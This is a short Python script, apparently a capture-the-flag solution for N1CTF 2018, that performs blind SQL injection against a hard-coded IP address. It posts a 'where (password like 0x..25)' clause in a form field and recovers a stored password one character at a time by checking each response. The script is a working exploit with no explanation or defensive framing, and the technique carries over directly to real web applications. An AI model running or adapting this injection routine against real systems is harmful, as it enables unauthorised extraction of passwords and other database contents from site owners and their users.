'''N1CTF-2018
https://www.freebuf.com/column/165452.html
'''
import requests
import string
import urllib
url = "http://47.97.168.223/index.php"
flag = ""
true_flag = ""
for i in range(1,1000):
    payload = flag
    for j in range(0x20, 0x7f):
        data = {
            "flag":"233333",
            "hi":urllib.unquote(" where (password like 0x%s25)"%(payload+hex(j)[2:])) #0x25: %
        }
        print data
        r =requests.post(url=url,data=data)
        if '233333' in r.content:
            flag += hex(j)[2:]
            true_flag += chr(j)
            print true_flag
            data1 = {
                "flag": "1",
                "hi": " where 1"
            }
            s = requests.post(url=url,data=data1)
            break